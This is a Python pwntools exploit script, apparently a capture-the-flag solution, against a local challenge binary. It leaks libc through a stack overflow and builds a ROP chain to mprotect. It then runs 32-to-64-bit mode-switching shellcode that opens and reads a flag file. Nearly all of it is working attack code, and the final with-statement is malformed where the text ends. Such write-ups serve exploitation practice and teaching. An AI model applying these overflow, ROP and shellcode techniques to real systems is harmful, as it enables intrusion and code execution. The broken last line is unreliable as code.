#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l": io = process("./vuln", env = {"LD_PRELOAD": "./libc.so.6"}) #  io = process("")

else:
    io = remote("localhost", 9999)

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
startElf = 0x80484D0

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def getBase():
    payload = cyclic(0x30) + p8(0x48) + p32(elf.plt["puts"]) + p32(startElf) + p32(elf.got["puts"])
    #  assert "\x10" in payload
    io.sendline(payload)
    libcBase = u32(io.recvuntil("\xf7")[-4: ]) - libc.symbols["puts"]
    success("libcBase -> {:#x}".format(libcBase))
    pause()
    return libcBase

if __name__ == "__main__":
    libcBase = getBase()

    pop3ret = 0x08048729
    payload = cyclic(0x30) + p8(0x48) + p32(libcBase + libc.symbols["mprotect"]) + p32(pop3ret) + p32(0x804a000) + p32(0x1000) + p32(7) + p32(elf.plt["read"]) + p32(elf.bss()) + p32(0) + p32(elf.bss()) + p32(0x200)
    io.sendline(payload)

    sc32 = '''
    BITS 32
    org 0x804ab00
    push 0x33
    call next
    next:
    add dword [esp], 5
    retf
    '''

    with open("sc32.asm", "w") as f:
        f.write(sc32)

    sc64 = '''
    BITS 64
    org 0x0804ab20
    jmp final
    prev:
    pop rdi
    xor rsi, rsi
    mov rax, 2
    syscall
    mov rdi, rax
    mov rax, 0
    mov rsi, 0x0804a900
    mov rdx, 0x100
    syscall
    mov rdi, 0
    mov rax, 60
    syscall
    final:
    call prev
    db './flag', 0
    '''

    with open("sc64.asm", "w") as f:
        f.write(sc64)

    os.popen("nasm -f bin -o sc32 sc32.asm")
    os.popen("nasm -f bin -o sc64 sc64.asm")

    with open("./sc32"), open("./sc64") as f1, f2:






